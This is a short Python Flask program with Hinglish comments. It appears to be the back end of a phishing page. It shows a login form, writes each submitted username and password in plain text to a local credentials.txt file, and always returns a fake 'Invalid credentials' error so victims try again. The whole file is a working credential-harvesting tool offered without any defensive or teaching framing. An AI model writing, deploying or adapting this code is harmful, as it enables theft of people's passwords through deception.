from flask import Flask, render_template, request

app = Flask(__name__)

# Home route - login page show karega
@app.route('/')
def home():
    return render_template('login.html')

# Login form se data capture karega
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Data ko credentials.txt file me store karega
    with open("credentials.txt", "a") as file:
        file.write(f"Username: {username}, Password: {password}\n")
    
    return render_template('login.html', error="Invalid credentials! Please try again.")

if __name__ == '__main__':
    app.run(debug=True)